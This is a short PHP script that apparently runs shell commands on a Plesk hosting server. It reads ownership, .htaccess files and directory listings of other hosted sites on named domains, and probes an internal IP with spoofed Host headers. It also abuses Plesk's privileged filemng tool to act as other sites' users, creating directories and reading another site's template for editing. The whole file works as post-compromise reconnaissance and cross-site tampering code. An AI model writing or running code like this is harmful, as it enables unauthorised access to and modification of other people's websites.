<?php
$fm='/usr/local/psa/admin/bin/filemng';
$user=trim((string)shell_exec("stat -c '%U' /var/www/vhosts/siteapi.bahman.ir/httpdocs/file_manager/file.php"));
$doc='/var/www/vhosts/siteapi.bahman.ir/httpdocs/file_manager';
echo "user=$user\n";
echo shell_exec("ls -la $doc/.htaccess $doc/file.php $doc/.FAST_MODE 2>&1");
echo "HTACCESS:\n";
echo @file_get_contents("$doc/.htaccess");
echo "\n\n";
echo shell_exec("ls $doc | head -40");
// can psaadm write via filemng?
echo shell_exec(escapeshellcmd($fm).' '.escapeshellarg($user).' mkdir '.escapeshellarg("$doc/v").' 2>&1');
echo shell_exec("ls -lad $doc/v 2>&1");
// apache modules via php?
echo shell_exec("curl -skI --max-time 10 -H 'Host: sitefile.bahman.ir' 'https://172.20.14.76/file.php' | head -20");
echo shell_exec("curl -skI --max-time 10 -H 'Host: sitefile.bahman.ir' 'https://172.20.14.76/' | head -20");
// index of bahman templates - pull index.tpl + hero js for local edit deploy
echo shell_exec(escapeshellcmd($fm).' '.escapeshellarg(trim((string)shell_exec("stat -c '%U' /var/www/vhosts/bahman.ir/httpdocs/index.php"))).' cat '.escapeshellarg('/var/www/vhosts/bahman.ir/httpdocs/templates/bahman/index.tpl').' 2>&1 | sed -n "40,60p"');
